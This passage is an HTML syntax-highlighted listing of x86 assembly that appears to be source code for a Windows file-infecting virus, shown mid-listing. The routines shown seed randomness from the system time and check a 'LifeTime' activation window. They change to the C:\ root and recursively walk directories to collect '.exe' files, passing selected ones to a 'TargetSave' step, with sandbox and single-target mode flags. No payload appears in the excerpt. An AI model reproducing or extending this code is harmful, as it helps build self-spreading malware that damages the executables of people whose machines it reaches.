</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000000FFh</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wHour</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000000FFh</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">STimeSimple</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">; LoadTime endp</span><span class="sc0">


</span><span class="sc1">; LoadRandom proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wSecond</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RandSeed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">; LoadRandom endp</span><span class="sc0">


</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">

</span><span class="sc5">e_LoadSys</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">e_GetKernel32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">e_GetApiTable</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">e_LoadApi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LoadSys</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">; LifeTime</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">LifeTime</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_1_LifeTime</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">STimeSimple</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_LifeTimeMin</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@_jb</span><span class="sc0"> </span><span class="sc5">_2_LifeTime</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_LifeTimeMax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@_ja</span><span class="sc0"> </span><span class="sc5">_2_LifeTime</span><span class="sc0">


</span><span class="sc5">_1_LifeTime</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">

</span><span class="sc5">_2_LifeTime</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LifeTime</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">; Target</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">Target</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNames</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNamesPointer</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_1_Target</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_ModeOnTarget</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_1_Target</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModeOnTargetFileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNamesPointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModeOnTargetFileNameSize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNamesPointer</span><span class="sc4">],</span><span class="sc5">@_PathSize</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">_2_Target</span><span class="sc0">


</span><span class="sc5">_1_Target</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">STimeFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">STime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTimeToFileTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">STimeFile.FT_dwHighDateTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_TargetSelectTimeMask</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">STimeTargetSelect</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirRoot</span><span class="sc4">],</span><span class="sc3">"\:C"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirDot</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirDotDouble</span><span class="sc4">],</span><span class="sc3">".."</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirMask</span><span class="sc4">],</span><span class="sc3">".*"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExeMask</span><span class="sc4">],</span><span class="sc3">"xe.*"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExeMask</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc3">"e"</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirInitial</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">@_PathSize</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">e_Target</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_PathSize</span><span class="sc0">
</span><span class="sc5">@@_ja</span><span class="sc0"> </span><span class="sc5">e_Target</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirRoot</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">e_Target</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirCurrentIsRoot</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExeRest</span><span class="sc4">],</span><span class="sc5">@_TargetNum</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">DeepFirst</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirInitial</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">e_Target</span><span class="sc0">


</span><span class="sc5">_2_Target</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">

</span><span class="sc5">e_Target</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Target</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc5">DeepFirst</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">; EXE part</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExeMask</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_1_DeepFirst</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExeSearchHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">_2_DeepFirst</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Select</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_3_DeepFirst</span><span class="sc0">

</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">TargetSave</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_7_DeepFirst</span><span class="sc0">

</span><span class="sc5">_3_DeepFirst</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExeSearchHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindNextFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_2_DeepFirst</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">; EXE part</span><span class="sc0">


</span><span class="sc5">_1_DeepFirst</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">; DIR part</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">_7_DeepFirst</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_ModeSandBox</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_7_DeepFirst</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirMask</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirSearchHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirCurrentIsRoot</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_8_DeepFirst</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirCurrentIsRoot</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">_4_DeepFirst</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_8_DeepFirst</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirSearchHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindNextFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirSearchHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindNextFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_6_DeepFirst</span><span class="sc0">


</span><span class="sc5">_4_DeepFirst</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_5_DeepFirst</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirSearchHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">DeepFirst</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirSearchHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_7_DeepFirst</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirDotDouble</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">_5_DeepFirst</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirSearchHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindNextFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_4_DeepFirst</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">; DIR part</span><span class="sc0">


</span><span class="sc5">_6_DeepFirst</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">

</span><span class="sc5">_7_DeepFirst</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DeepFirst</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc5">Select</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_ModeSandBox</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_1_Select</span><span class="sc0">


